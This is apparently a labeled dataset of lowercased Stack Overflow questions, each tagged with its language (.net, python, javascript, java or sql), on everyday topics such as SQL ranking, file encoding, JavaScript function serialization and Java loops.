assembly.getexecutingassembly().getname().getpublickey();    for (int i=0; i &lt; deserializedassembly.length; i++){       if ( deserializedassembly[i] != outkey[i] )          return false;     }     return true; } </code></pre>   (any error handling or non-public key checks removed for clarity)    note this works as long as the executing assembly (web app) and plugins are signed using the same key. this works for us internally but if your plugin api is public you d need a different way of managing trust.,.net

creating trapezoid. requires exactly double number of points to find  i want to create a strip on 2d plane. i got solution to do this by making trapezoid. in fact  other ways of creating strip on 2d (scalable to nd) plane is also acceptable. this code takes area of trapezoid from user and then picking any random number from input range 0 - 1 and then incrementally picking second number set until required (approx) area is obtained.  the function create_trapezoid gives first point set  second point set  length of trapezoid and achieved area. it looks perfect. then i pick some random numbers to determine after how many tries a number falls in newly made strip. the theoretical limit should be <code>1 / area</code>. but it always give me <strong>exactly</strong> double number. anybody guide me what i am missing    <pre><code>import math import random   def test_point(point  strip_pts):     inside = false     a = point[0] + point[1]     if strip_pts[0] &lt; a &lt; strip_pts[1]:         inside = true     return inside   def calculate_area(l1  l2  h):     return 0.5 * (l1 + l2) * h   def create_trapezoid(area):     actual_failure_region = area     p1 = random.random()  # first point set     l1 = math.sqrt(p1 ** 2 + p1 ** 2)     l2 = l1     increment = area / 10000     h = 0     a_temp = 0     while a_temp &lt; actual_failure_region:         l2 = l2 + increment         h = h + increment         a_temp = calculate_area(l1  l2  h)     achieved_area_region = a_temp     p2 = math.sqrt((l2 ** 2) / 2)     return [p1  p2  l1  l2  h  achieved_area_region]   iterations = 1000 mean_number_of_tries = 0 for i in range(1  iterations + 1):     strip_points = create_trapezoid(0.1)     falls_in_trapezoid = false     j = 0     tries = 0     while falls_in_trapezoid is false:         test_case = (random.random()  random.random())         falls_in_trapezoid = test_point(test_case  strip_points)         tries = tries + 1     mean_number_of_tries = mean_number_of_tries + tries     print(i   f_measure:   tries   mean:   mean_number_of_tries / i) </code></pre>   i have made 2d visualization of strip and one random point that lies in strip on: <a href= https://www.desmos.com/calculator/z0x2e2l7md  rel= nofollow noreferrer >https://www.desmos.com/calculator/z0x2e2l7md</a>,python
inverse operation for javascript s function.tostring()  for javascript application i need to be able to let the user save the state of an object. this involves saving a set of custom functions that were previously created dynamically or through a gui  and loading these stored functions later. essentially i need to serialize and unserialize functions.    right now i achieve the serialize part by using the function object s .tostring() method:   <pre><code>func.tostring().replace(      \  ).replace(/(\r)/g     ).replace(/(\n)/g     ).replace(/(\t)/g     ) </code></pre>   this gives me  serialized  functions like this beauty (note that the function is unnamed):   <pre><code> function (someparameter) {this.somefunctionname(return  something ;}  </code></pre>   unserializing this is where i struggle. my current best solution for unserializing the functions is this:   <pre><code>var func = eval(  t =  +  so.actions[i].func); </code></pre>   note how i prepend the serialized function with <code>t =</code> before calling <code>eval()</code> on it. i don t like doing this because it creates a global variable but i cannot find a way around it. when not prepending this  i receive a  syntaxerror: unexpected token ( . when prepending <code>var t =</code>  eval() does not return the function but <code>undefined</code>.    are there alternative ways to  unserialize  an unnamed function     ps: i am aware of the security implications of using eval() on user input. for the foreseeable future i am the only user of this software  so this is currently a non-issue.,javascript

making my own data type  i m new to programming and java. i m trying to write my own data type/collection class but i m not quite sure how to go about it.     i want a class that contains a string  and an array-list of strings.    usually i would go about making a data type like this:   <pre><code>public class collection {      private int id;     private string word;     private int howmany;     private char firstchar;      public collection (int i  string w  int h  char f){         id = i;         word = w;         howmany = h;         firstchar = f;     } //getters and setters } </code></pre>   not sure how i can do this with an arraylist field.     my goal behind this is to have a class of unique words in the string field read in from .txt files and in the arraylist field have all the .txt file names that contain that word.     edit: building on tom anderson s response and what i initially thought to do:   <pre><code>public class collection {      private int id;     private string word;     private int howmany;     private char firstchar;     private list&lt;string&gt; filenames;      public collection (int i  string w  int h  char f  list&lt;string&gt; filenames){         id = i;         word = w;         howmany = h;         firstchar = f;         this.filenames = filenames;     }  } </code></pre>   i m still not sure how to use this since i can not simply add a string to the arraylist parameter when creating a new instance of the my collection class. such as this:   <pre><code>arraylist&lt;collection&gt; collection = new arraylist&lt;collection&gt;(); collection newtest= new collection( test   test ); collection.add(newtest); </code></pre>,java

another sql statement i don t understand  i know the answer to my problem has something to do with ranking  just don t know what to do exactly. the goal of my statement is to get only 5 records but give priority to the records from a certain table over another.    i have two tables: <code>news</code> and <code>newstolocation</code>.    let s pretend there are 4 news items in the news table and 3 in the <code>newstolocation</code> that meet my requirements. since i can only select 5 i want to make sure the 4 in the <code>news</code> table get preference and then only select 1 from the <code>newstolocation</code> table. my current query is doing the opposite and i can t figure out how to fix it.    here is the entire query.   <pre><code>select  newspotlights.*  from (select      top 5 n.news_id       n.is_spotlight       n.location_id       n.news_title       cast(n.news_content as varchar(200)) as news_content       n.writing_date      n.publication_date       n.end_date       n.alt_uri       n.youtube_code       n.icon_img_file       n.banner_img_file from      (select          n.news_id     from rcde_news n     where n.location_id = 4     and n.is_spotlight = 1 and n.publication_date &lt; getdate() and n.end_date &gt; getdate()     and n.status_id = 2 /*2 = active rcde_itemstatus*/     union     select          n.news_id     from rcde_newstolocation ntl     inner join rcde_news n on ntl.news_id = n.news_id     where ntl.location_id = 4     and n.status_id = 2 /*2 = active rcde_itemstatus*/      ) as news inner join rcde_news n on news.news_id = n.news_id where n.is_spotlight = 1 and n.publication_date &lt; getdate() and n.end_date &gt; getdate() order by publication_date desc ) as newspotlights </code></pre>   i feel like i should be able to do some order by ranking on the most inner query but i am not sure what to do exactly. i sort of understand the ranking but no clue how i would do it on a <code>union</code> statement. could i do something as simple as selecting 1 as rank and 2 as rank on the different parts of the union respectively and then order by rank,sql

preserving text file encoding (ascii  utf-8  utf-16)  i have a simple text file processing tool written in c#  the skeleton looks like this:   <pre><code>    using (streamreader reader = new streamreader(absfilename  true)) // auto detect encoding     using (streamwriter writer = new streamwriter(tmpfilename  false  reader.currentencoding)) // open writer with the same encoding as reader     {         string line;         while ((line = reader.readline()) != null)         {             // do something with line             writer.writeline(line);         }     } </code></pre>   most of the files it operates on are ascii files  with the occasional utf-16 here and there. i want to preserve the file encoding  the newly created file should have the same encoding as the file being read - that s why i open streamwriter with the currentencoding of reader.     my problem is some of the utf-16 files lack preamble and after the streamreader is opened it has currentencoding set to utf-8  which causes the writer to be opened in utf-8 mode. when debugging i can see the reader changes its currentencoding property to utf-16 after the first call to readline  but by that time the writer is already opened.    i can think of a few workarounds (opening the writer later or going over the source file twice - the first one just to detect encoding)  but thought i d ask experts for opinion first. note that i m not concerned with code pages of the ascii files  i m only concerned with ascii/utf-8/utf-16 encodings.,.net

escaping question mark ( ) in sql where clause  in the various sql products i use  a question mark ( ) marks an input parameter in a query.    how do i escape that behavior and search for text that contains a question mark  for example...   <pre><code>select * from   a_table where  a_field =  this is a question mark not an input parameter   </code></pre>   ...where the question mark above is a literal question mark  not a place holder.  if the answer is product specific  i am currently using derby (aka java db).,sql
what is considered to be .net   when finding new jobs and looking at resumes you commonly see that someone expects or has experience with **.**net.  but what does that really mean  it seems that my current employer expected it to mean that i was familiar with the asp.net controls (gridview  etc) when in reality i had never used any of them before. i had used c# for 6 months while working on a project and i was familiar with many of the data structures found in **.**net.    which parts of .net do you have to be familiar with before you can say that you re experienced with it,.net

loop not halting at break   i wrote a name checker that uses a for loop to check if each individual character in the string is a letter  and i wrote an if statement within the for loop stating that if the if statement conditions are met  print  your name is valid!  and break. but if the conditions are not met  rerun the loop.    <pre><code>public static void namevalid() {     scanner in = new scanner(system.in);     system.out.println( enter your name );     string name = in.nextline();     int q = name.length();      for (int i = 0; i &lt; name.length(); i++) {         if (character.isletter(name.charat(i)) &amp;&amp; q &gt;= 2) {             system.out.println( your name is valid! );             break;         } else {             system.out.println( your name is invalid! please enter a valid name! );             namevalid();         }     } } </code></pre>   if i enter a valid string the first time around  everything is fine  and it moves on to the second method. if i enter an invalid string  it gives me the expected error message and reruns the loop. but then when i enter a valid string after that  it continuously runs the loop. the output i get is this:   <pre class= lang-none prettyprint-override ><code>enter your name 123 your name is invalid! please enter a valid name! enter your name fred your name is valid! your name is invalid! please enter a valid name! enter your name </code></pre>,java

how to get custom exception details out of a sys.exc_info   i want to consolidate some exception handling code into a single exception clause but i m having difficulty with getting all the exception info i need since exc_info is missing info.   <pre><code>import sys  class customexception(exception):     def __init__(self  custom_code):         exception.__init__(self)         self.custom_code = custom_code  try:         raise customexception( test ) # this is ok # except customexception as ex: #       print  caught customexception  custom_code=  + ex.custom_code # but i want to be able to have a single except clause... except:         ex = sys.exc_info()[0]         if ex is customexception:                 # attributeerror:  tuple  object has no attribute  custom_code                  print  caught customexception  custom_code=  + ex.custom_code </code></pre>   the overall idea is that the code in the except clause can be put in a function that anyone can call just by catching except. i m using python 2.7.,python
i m new to python and i feel like i am doing this code the long way but i am stuck at what to do next  create a program. the program lets the user enter the loan amount and loan period in number of years.  the program will then display the monthly and total payments for each annual interest rate starting from 4 to 8 in increments of 1.     be sure to define a function to calculate the values and print the table displaying the interest rate in the first column  the monthly payment in the second column  and the total payment in the third column.  your program should not allow the user to enter negative amounts for the loan amount and the loan period.    once the table has been displayed the user should be prompted as to whether they wish to enter another loan amount and loan period.      here is what i have so far:   <pre><code>import math  def main():      loan_amount = input( enter the amount of the loan :  )     loanyears = input( enter the number of years of the loan:  )      print  interest rate         monthly payment          total payment      print       4%                monthly_payment           total_payment     print       5%                monthly_payment2          total_payment2     print       6%                monthly_payment3          total_payment3     print       7%                monthly_payment4          total_payment4     print       8%                monthly_payment5          total_payment5  def payment():     monthly_rate = (4/100.00)/ 12     monthly_rate2 = (5/100.00)/ 12     monthly_rate3 = (6/100.00)/ 12     monthly_rate4 = (7/100.00)/ 12     monthly_rate5 = (8/100.00)/ 12      monthlypayment = loan_amount * monthly_rate / (1 - math.pow(1/(1 + monthly_rate)loanyears * 12))     monthlypayment2 = loan_amount * monthly_rate2 / (1 - math.pow(1/(1 + monthly_rate2)loanyears * 12))     monthlypayment3 = loan_amount * monthly_rate3 / (1 - math.pow(1/(1 + monthly_rate3)loanyears * 12))     monthlypayment4 = loan_amount * monthly_rate4 / (1 - math.pow(1/(1 + monthly_rate4)loanyears * 12))     monthlypayment5 = loan_amount * monthly_rate5 / (1 - math.pow(1/(1 + monthly_rate5)loanyears * 12))     total_payment = monthly_payment * loan_years * 12     total_payment2 = monthly_payment2 * loan_years * 12     total_payment3 = monthly_payment3 * loan_years * 12     total_payment4 = monthly_payment4 * loan_years * 12     total_payment5 = monthly_payment5 * loan_years * 12    main() </code></pre>   <a href= http://i.stack.imgur.com/kk2ry.png  rel= nofollow >here is the error i receive</a>,python

compare value and add if matches to an array  im trying to merge 2 data sources in 1  i wanna loop through them and if a specefic value matches than add it to the first object with the same value and add the in the emty array what is already there. no matter how much objects i have.    so lets say i have this information    source 1   <pre><code>one = {      teams : [         {             name:  abc               members: []              rooms:  0          }          {             name:  def               members: []              rooms:  1          }     ] } </code></pre>   source 2   <pre><code>two = {      persons : [         {             name:  foo               gender:  male               room:  1          }          {             name:  bar               gender:  female               room:  2          }     ] } </code></pre>   and what i want is that the  persons  array merge to the members array if the  room and rooms  value matches.    what i would assume is something similar like this:   <pre><code> for(var i = 0 ; i &lt; two.persons.length; i++) {     if (one.teams[i].rooms == two.persons[i].room) {             data.teams[i].members.push(two.persons[i]);         }  } </code></pre>,javascript

why write  .call(this)  at the end of an javascript anonymous function   i have seen javascript written like this (it was at a demonstration  and i don’t have the actual code at hand  but it was implied this was normal):   <pre><code>(function() {          var a = 1;      this.saya = function() {         alert(a);     }  }).call(this);  saya(); </code></pre>   i suppose it is written an an anonymous function so that the variable <code>a</code> is not globally available.    what could the point of the <code>.call(this)</code> be   since this function was not nested  <code>this</code> was just the window.  how does it differ from just writing <code>()</code> at the end,javascript

declaring and defining global variables as function result sometimes works   some programming languages i ve worked with are fussy about setting global variables to the result of a function  so i m in the habit of doing it in a main() or an init().    this was sent to me by a friend and much to my surprise  it works totally fine locally on my computer and on hers  but won t work on either of our servers:   <pre><code>function getvalue(val) {     return document.getelementbyid(val); } var myvalue = getvalue( output ); // is this kosher  function init() {     myvalue.innerhtml =  foo ; //error: myvalue is null     //document.getelementbyid( output ).innerhtml= bar ; //this works though } window.onload = init </code></pre>   however  oddly enough  this works on the servers as well as locally:   <pre><code>function getvalue(val) {     return val; } var myvalue = getvalue( output ); function init() {     alert(myvalue); } window.onload = init; </code></pre>   i fixed it by doing this:   <pre><code>function getvalue(val) {     return document.getelementbyid(val); } var myvalue; // don t set the value here function init() {     myvalue = getvalue( output ); // but here instead     myvalue.innerhtml =  foo ; // this is fine } window.onload = init </code></pre>   ...but now i m confused as to why the 2nd block of code would work if the 1st one doesn t.  is it something to do with the js running through the declarations before the html document has time to load when on a server     just for reference  the document is as such:   <pre><code>&lt;!doctype html&gt; &lt;html lang= en &gt;         &lt;head&gt;                 &lt;meta charset= utf-8 &gt;                 &lt;script src= test.js &gt;&lt;/script&gt;         &lt;/head&gt;         &lt;body&gt;                 &lt;div id= output &gt;                 &lt;/div&gt;         &lt;/body&gt; &lt;/html&gt; </code></pre>,javascript

iteratively building sets of tuples  i am trying to iteratively build a set of tuples using <code>set.add(tuple)</code>. the problem is that first tuple does not remain encapsulated as a tuple. its members enter the set as unique elements.   <pre><code># what i d like to do s = set((1 2)) s.add((3 4)) s.add((5 6))  &gt;&gt;&gt;s &gt;&gt;&gt;{1  2  (3  4)  (5  6)} </code></pre>   of course i can build the whole thing up as a list of tuples and then convert it to a set  but i d like to know if it is possible to avoid casting from list to set.   <pre><code># works with some extra work l = [(1 2)] l.append((3 4)) l.append((5 6)) s = set(l)  &gt;&gt;&gt;s &gt;&gt;&gt;&gt; {(1  2)  (3  4)  (5  6)} </code></pre>   thanks.,python

concordances with python  your goals are to prompt the user for a text file to analyze. you will also be provided  with a file of stop words—words that will be ignored when you analyze the file. after  creating the concordance   print the concordance results as indicated in the example  output below. for each word in the concordance you will print:   <ul> <li>the word</li> <li>the total number of occurrences</li> <li>for each occurrence: <ul> <li>the line number in the file (the first line is line #1)</li> <li>the local context. the local context is the original line with the specified word in all upper case.</li> </ul></li> </ul>   this is what i have so far:    <pre><code>import string file_str = raw_input( what file to analyze: ) file_obj = open(file_str) for line in file_obj.readlines():     line = line.strip()     split_line = line.split()     for word in split_line:         word = word.lower()         word = word.strip(string.punctuation) </code></pre>   i m not sure where to go from there!,python
reproduce windows product key input  i m starting to put together an activation dialog as part of my application. i <em>really</em> like the way microsoft did theirs recently with windows 7  more specifically the way the hyphens that separate each quintet of the product key are added and removed automatically.    after taking a quick look at it  it seems like it s a bit more difficult to implement smoothly than i had first though. that or i ve been starring at the issue for too long. is there any sample code or tutorial that reproduces this behavior for a textbox     <img src= https://i.stack.imgur.com/012ve.png  alt= alt text >,.net

object to object mapping in .net 2.0  i wonder if anyone can recommend an alternative to automapper that will work in .net2.0.    i have a dll which describes a reasonably complex structure. the dll sits at both ends of webservice however when the data is retrieved through the webservice  the namespaces prevent direct mapping of the object so i am having to resort to coding a mapping class.    i incorporated automapper and it does exactly as i want but it won t work with .net2.0. i need to use .net2.0 as there are several hundred remote machines which will run the client software and they are limited to .net2.0.    any help would be appreciated.,.net

setting a variable  well i have a few questions and i like to make sure i am understanding what i am doing. so here it is i am working on a project and i am suppose to create a variable called minorder and populate it with the smallest line item amount after discount for the northwind customerno ‘alfki’ (careful: we’re dealing with currency here  so don’t just assume you’re going to use an int.) output the final value of minorder. now this is what i have:   <pre><code>   use northwind declare @minorder money; set @minorder = (select min(unitprice) from [order details]); select @minorder </code></pre>   i notice that i didn t put in the alfki. well i seen it said not use really use the int. i went and declare the minorder because it does with a variable and then i am taking that variable using it for the unitprice even though it says discount but when i try to put discount there it showed a red error. i am wounder if i should use another set to do the customerid = alfki or if i can throw it into this code. i know my code might be way off but thats why i am posting it so i can have an understanding when it comes to this only because it is a part of programming. thanks,sql

how do i make a program with multiple classes run until the user specifies  e  instead of terminating at the end of main   i m working on a program that allows a user to read a file  search for specific text (still in progress) in a file and write (append) to a file. the program has four classes  with one method in each  corresponding to each of the functions of the program.     my first class (containing main) prompts the user to specify whether they want to read/search/write to a default file. like so:   <pre><code>public class simpledbfunction {      public static void main(string args[]) throws ioexception{          //prompt user to provide input in accordance with desired function         system.out.println( type  r  to read a file;  s  to search for text within a file;  w  to write to a file;  e  to exit );          //initialize scanner and a string variable to hold the value of scanner variable         scanner ichoice = new scanner(system.in);       //ichoice - inputchoice         string userchoice = ichoice.next();          //if user specifies  r  go to filereader class         if(userchoice.equalsignorecase( r )){             simpledbreader sdbrobject = new simpledbreader();             sdbrobject.sdbreader(args);          //if user specifies  s  go to textsearch class         }else if(userchoice.equalsignorecase( s )){             simpledbsearch sdbsobject = new simpledbsearch();             sdbsobject.sdbsearch(args);          //if user specifies  w  go to filewriter class         }else if(userchoice.equalsignorecase( w )){             simpledbwriter sdbwobject = new simpledbwriter();             sdbwobject.sdbwriter(args);          //if user specifies  e  terminate program         }else if(userchoice.equalsignorecase( e )){             system.exit(0);         }         ichoice.close();        //close scanner  probably redundant here     } } </code></pre>   the specific issue i have is that i want the program to run in this  state  of awaiting user input  even after the user has already prompted the program to perform one of the actions. i have tried to use both a while loop  and a do-while loop  to achieve this; but both ended up infinitely repeating whichever function the user specifies instead of running it once and returning to main. i also tried to utilize  break  in a few different positions (foolish of me)  only to find that it terminates my program completely when it is reached.    i m still a programming green-horn  so please bear with me. i know that my code isn t the most polished thing around and that there are a multitude of ways to improve it  but what i want is full functionality before i begin improving. if you wish to see the classes pertaining to reading  searching and writing please let me know.,java

trigonometry calculator radians to degrees and vice versa in .net  i m quite new to programming and was unable to find an answer on these forums to the question i have.    i am using vb.net and i want to put together a program that can convert degrees to radians (and vice versa)  while the angle is calculated.    so in other words  there are two text boxes and  one button. the button is  sin x.  the text boxes have labels next to them:  degrees  and  radians.     let s say you enter a value for degrees and click  for example   sin x.  from there  the program takes the value you entered  converts it to radians  calculates the sin of that converted value  and showcases it in the  radians  text box. the idea is for you to also be able to put in a value inside the  radians  text box  the program converts it to degrees  takes the sin of converted value  and outputs it on the  degrees text box.     i succeed in getting degrees converted to radians  calculated  and put out on the radians text box  however i have hit a brick wall and am confused as to how i can have values be put in the radians text box  converted to degrees  and put out on the degrees text box.    here s the code i have so far:   <pre><code>public class trigonometryconverter      private sub btnsin_click(sender as object  e as eventargs) handles btnsin.click         dim input  input2 as double         dim output  soutput  output2  soutput2 as double         const cfactor as double = (math.pi) / 180         input = convert.todouble(tbxd.text)         input2 = convert.todouble(tbxr.text)         output = input * cfactor         output2 = input2 / cfactor         soutput = math.sin(output)         soutput2 = math.sin(output2)         tbxr.text = convert.tostring(soutput)         tbxd.text = convert.tostring(soutput2)      end sub end class </code></pre>   tbxd.text is the text box where  degrees  values are put in and out. tbxr.text is the text box where  radian  values are put in and out.    the program with the code above does not work at all  however  i can have the program work partially where degrees switch to radians  are calculated  and put out if i use the code below:   <pre><code>public class trigonometryconverter      private sub btnsin_click(sender as object  e as eventargs) handles btnsin.click         dim input as double         dim output  soutput as double         const cfactor as double = (math.pi) / 180         input = convert.todouble(tbxd.text)         output = input * cfactor         soutput = math.sin(output)         tbxr.text = convert.tostring(soutput)      end sub end class </code></pre>   tl;dr version: i have a program and want to have both text boxes take in values input and put out calculated values.    any suggestions/solutions  thanks!,.net

need help in merging questions with the answer  i m creating a calculator which has to work out expressions like (12.0 + 10.0) * 3.0 so far i have created the sub classes according to each mathematical operation.    for example:    addition. java   <pre><code>class addition extends arithmeticexpression {     addition(double value1  double value2) {         result = value1 + value2;         this.value1 = value1;         this.value2 = value2;     }     public addition( arithmeticexpression an double num2) {         value1 = an.evaluate();         value2 = num2;         result1 = value1 + value2;     }     public double evaluate1() {         system.out.println( arbitrary answer is );         return result1;     }     public double display1() {         system.out.println( arbitrary question is );         system.out.println(  (  + value1 +  +   + value2 +  )  +   =  + result1);         return result1;     }     public double display() {         system.out.println( addition question is );         system.out.println(value1 +   +  + value2);         return result;     }     public double evaluate() {         system.out.println( addition answer is );         system.out.println(result);         return result;     } } </code></pre>   and another for the multiplication which is similar to that but multiplies in stead of adding. i then created a class for the question i am answering the class is below. arbitrary.java   <pre><code>public class arbitrary {     public arbitrary() {            addition arbitrary1 = new addition(12.0 10.0);            arbitrary1.display1();            multiplication arbitrary2 = new multiplication(arbitrary1 3.0);            arbitrary2.display2();     } } </code></pre>   when it displays the answer it displays:   <pre><code>arbitrary question is (12.0+10.0) =0.0 addition answer is 22.0 arbitrary question is (22.0*3.0) = 66.0 </code></pre>   any suggestions on how i can print out the original question next to the answer,java

how do i stop browser control in .net from flickering  i have a control where i need to reload browser content very often (like twice a second in some cases). it doesn t matter if it takes long for it to load  but what i don t want is that whole web control is flickering.    i made two web browsers  i always change document of that one which isn t visible  then i wait using a timer until document is loaded and after that i send it to front over the current browser.    this doesn t help  it s still flickering  is there any way how to make it appear smoothly after document is loaded  meanwhile the previous browser can stay    this whole control is actually kind of chat window  so the background of window is same  however content is growing,.net

reading statistics from a file  one of the homework assignments my instructor gave me was a baseball statistics program. it reads from a file called stats.dat  which contains the name of a baseball player s name and a list of what happened when they were at the bat. it reads and prints their name and the amount of outs(o)  hits(h)  walks(w)  and sacrifice flies(s) that they have. this is what the file contains:   <pre><code>willy wonk o o h o o o o h w o o o o s h o h shari jones h o o s s h o o o h o o o barry bands h h w o o o w h o o h h o o w w w h o o sally slugger o h h o o h h w missy lots o o s o o w o o o joe jones o h o o o o h h o o o o w o o o h o h h larry loop w s o o o h o o h s o o o h h sarah swift o o o o h h w o o o bill bird h o h o h w o o o h s s h o o o o o o don daring o o h h o o h o h o o o o o o h jill jet o s s h o o h h o o o h o h w o o h h o </code></pre>   so far i have the basic idea down  even though i don t quite understand what each line is doing(i modified some code of a program in the book my class is reading that prints a url that s in a text file and then prints out each part of the url that s separated by a /). i have it so that the program prints out the player s name  but i m stumped on how to print out the amount of hits  outs  walks  and sacrifice flies they get. so far it s reading 1 character out of the line  then it goes down to the next player and prints out 2  then 3  etc. here s the code i have for it so far:   <pre><code>import java.util.scanner; import java.io.*;  public class baseballstats {  public static void main(string [] args) throws ioexception  {   int hit = 0  walk = 0  sac = 0  out = 0  length = 0  wholelength = 0;   scanner filescan  linescan  statscan;   string filename  playername  line  stats  playerstats;   scanner scan = new scanner(system.in);    system.out.println( enter the name of the file:  );   filename = scan.nextline();   filescan = new scanner(new file(filename));    while (filescan.hasnext())   {    system.out.println();    line = ( player:   + filescan.nextline());    wholelength = line.length();     linescan = new scanner(line);    linescan.usedelimiter(   );     stats = linescan.next();    statscan = new scanner(stats);    statscan.usedelimiter(   );      while (statscan.hasnext())    {     system.out.println(statscan.next());     length = stats.length() - 1;       for (int i = 0; i &lt; length; i++)     {       if (stats.charat(i) ==  h )         hit++;       else if (stats.charat(i) ==  o )         out++;       else if (stats.charat(i) ==  w )         walk++;       else if (stats.charat(i) ==  s )         sac++;     }    }     system.out.println( hits:   + hit +  \nouts:   + out +  \nwalks:   + walk +               \nsacrifice flies:   + sac);   }  } } </code></pre>   (i m having a hard time getting the last part of the last statement in my code to appear correctly in the editor  sorry if it looks a bit weird) i have been wondering what s wrong and i can t figure it out so far. is there anything to get me on the right track,java
how to retrieve the output of a .net project without the dependencies  when one builds a .net project  the output is copied into an output folder (e.g.: the bin folder); not only the binaries issued from the project s source code are copied  but also all the dependencies (file references) marked with the option copylocal=true.    for the purpose of a custom build task (i.e.: when compiling on team build) i would like to know how get the list of binaries issued from a build without those dependencies (i may not -  and don t want anyway - to set copylocal=false).    my issue is that i didn t find a clean way to determined this output. the closest solution i have is to loop on the project files  read the assemblyname and check if there are pdb  xml  resx files foreseen. but still  i am sometimes missing resource files ( ) and maybe other outputs as i don t know all the possible items.    so my question is: do you know any methods/tricks/algorithms to get the list of binaries issued by a build; i.e. assemblies  satellite assemblies (+ path of their subfolders)  pbd  xml (i.e.: documentation) but without the dependencies,.net

in python  why doesn t  y = x; y += 1  also increment x   first create a function for displaying reference count (note that we have to -1 each time to get the correct value  as the function itself incref-s the argument)   <pre><code>&gt;&gt;&gt; from sys import getrefcount as rc &gt;&gt;&gt; x=1.1 &gt;&gt;&gt; rc(x)-1 1 </code></pre>   now make another reference to the same <code>pyobject</code>:   <pre><code>&gt;&gt;&gt; y=x  &gt;&gt;&gt; rc(x)-1 2 &gt;&gt;&gt; rc(y)-1 2  &gt;&gt;&gt; x is y true </code></pre>   now perform an operation on the second handle  <code>y</code>:   <pre><code>&gt;&gt;&gt; y+=1 </code></pre>   this should be invoking <code>pynumber_inplaceadd</code> on the <code>pyobject</code> that <code>y</code> points to.    so if this is true i would be expecting <code>x</code> to also read <code>2.1</code>   <pre><code>&gt;&gt;&gt; x y (1.1  2.1)  &gt;&gt;&gt; x is y false  &gt;&gt;&gt; rc(x)-1 1 &gt;&gt;&gt; rc(y)-1 1 </code></pre>   so my question is  what is python doing internally to provide the right behaviour  rather than the behaviour i would expect from looking at <code>pynumber_inplaceadd</code>     (note: i am using <code>1.1</code>; if i used <code>1</code> the initial reference count would be >300  because <code>1</code> must be used all over the place behind-the-scenes in cpython  and it is clever enough to reuse objects.)    <em>(this also begs the question: if i have <code>foo = 20; bar = 19; bar += 1</code> does this mean it has to look through all its objects and check whether there already exists an object with this value  and if so reuse it  a simple test shows that the answer is no. which is good news. it would be horribly slow once the program size gets big. so python must just optimise for small integers.)</em>,python
insertcell() with unique id  i am having trouble with the insertrow &amp; insertcell()  i have been searching around for the past few hours  but unfortunately  i have not found the answer.    i have a code which adds a new row to my table with 5 cells.   <pre><code>function mycreatefunction() {  var table = document.getelementbyid( mytable ); var row = table.insertrow(-1); var cell1 = row.insertcell(0); var cell2 = row.insertcell(1); var cell3 = row.insertcell(2); var cell4 = row.insertcell(3); var cell5 = row.insertcell(4); cell1.innerhtml =  &lt;input type=\ text\  id=\ des\  name=\ des\  placeholder=\ \  class=\ form-control input-sm\  value=\ \ /&gt; ; cell2.innerhtml =  &lt;input type=\ text\  id=\ qu\  name=\ qu\  placeholder=\ \  class=\ form-control input-sm\  value=\ \ /&gt; ; cell3.innerhtml =  &lt;input type=\ text\  id=\ pu\  name=\ pu\  placeholder=\ \  class=\ form-control input-sm\  value=\ \ /&gt; ; cell4.innerhtml =  &lt;input type=\ text\  id=\ rl\  name=\ rl\  placeholder=\ \  class=\ form-control input-sm\  value=\ \ /&gt; ; cell5.innerhtml =  &lt;input type=\ text\  id=\ tlht\  name=\ tlht\  placeholder=\ \  class=\ form-control input-sm\  value=\ \ /&gt; ;  return false; }  function mydeletefunction() { document.getelementbyid( mytable ).deleterow(-1);  return false } </code></pre>   each time i hit the button     <pre><code>onclick= return mycreatefunction()  </code></pre>   a new row is added  but the issue is  if i add 2 rows each 5 cells will have the same id &amp; name. each cell1 will have same id  each cell2 will have same id.....    no need to say that this is used inside a form  where i will need to add a new row and add content  which will be saved in a database.    what i need   i need to add a number next to the name and id each time i create a new row.    example of what i need:    if i hit the button it will create all 5 new cells but the id &amp; name changes. here and now  the name and id of the first cell is  des  when button click i need des1  when i click again i new row is created but the cell name and id is des2.. des3... des4... the number should be applied to all id s and name s of all cells created on the onclick.    don t know if it s clear enough.    thank you very much  help will be greatly appreciated.,javascript
python dictionary values pointing to list elements  is there any way to keep in a dict values references to elements of a list  and modify the list via the dict    <pre><code>a = [1  2] b = [11  22]  d = {k: v for k  v in zip(a  b)} d[1] = 33 print b  d </code></pre>   the output is of the 2nd print:    <pre><code>[11  22] {1: 33  2: 22} </code></pre>   while i would like:    <pre><code>[33  22] {1: 33  2: 22} </code></pre>   i suspect both the dictionary creator and the modification are not correct...     in c it would be possible to keep the pointers in the dictionary and modify the value via the <code>*</code> operator.     anything similar in python or any other pythonic way to achieve this,python

which tostring technique is more efficient   i have a class called zebra (not her actual name). zebra overrides the tostring method to provide her own convoluted obfuscated stringification.    which is more efficient to stringify an instance of zebra  presuming that i have to do this stringification millions of times per session.   <ol> <li><code>zebra.tostring()</code></li> <li><code>  +zebra</code></li> <li><code>static string blank (singleton)</code><br> <code>blank+zebra (multiple executions)</code>.</li> </ol>   where the value of zebra is not assured to be the same.    i am conjecturing that the answer could be - no concern: the compiler makes them all equivalent. if that is not the answer  please describe the instantiation process that makes them different. (2) and (3) could be the same  since the compiler would group all similar strings and assign them to a single reference.    normally  i do <code>  +zebra</code> because i am too lazy to type <code>zebra.tostring()</code>.    <strong>attn</strong>: to clarify.    i have seen questions having been criticised like  why do you want to do this  it s impractical  if every programmer refrains from asking questions because it has no practical value  or every mathematician does the same - that would be the end of the human race.    if i wrote an iteration routine  the differences might be too small. i am less interested in an experimental result than i am interested in the difference in processes:    for example  zebra.tostring() would invoke only one tostring while   +zebra would invoke an extra string instantiation and and extra string concat. which would make it less efficient. or is it. or does the compiler nullify that.     please do not answer if your answer is focused on writing an iterative routine  whose results will not explain the compiler or machine process.    virtue of a good programmer = lazy to write code but not lazy to think.,java

